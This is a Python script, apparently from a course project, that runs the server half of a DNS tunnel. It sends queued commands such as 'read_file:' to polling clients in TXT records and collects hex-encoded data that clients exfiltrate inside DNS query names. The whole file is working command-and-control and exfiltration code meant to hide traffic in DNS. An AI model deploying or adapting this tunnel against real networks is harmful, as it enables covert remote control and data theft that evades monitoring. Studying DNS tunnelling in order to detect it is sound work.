import yaml

import socket
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT
# Command
commands = {
    "client1": "read_file:/home/xodexoda/Documents/BDF302/DNSTunnel/data/beispiel.txt"
}
receivedData = {}

#  Konfiguration laden
with open('config.yaml', 'r') as configFile:
    configStruct = yaml.safe_load(configFile)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((configStruct["server"]["ip"], configStruct["server"]["port"]))
print("DNS Server läuft...")

while True:
    data, ipAdr = sock.recvfrom(512)
    request = DNSRecord.parse(data)
    qname = str(request.q.qname)
    labels = qname.split('.')
    client_id = labels[-3] if len(labels) >= 3 else "unknown"
    payload = labels[0]

    if payload == "poll":
        reply = request.reply()
        cmd = commands.pop(client_id, "noop")
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd), ttl=60))
        sock.sendto(reply.pack(), ipAdr)
    else:
        receivedData.setdefault(client_id, []).append(payload)
        print(f"{client_id} → {payload}")	
    try:
            decoded = bytes.fromhex(payload).decode()
            print(f"→ {decoded}")
    except:
            pass

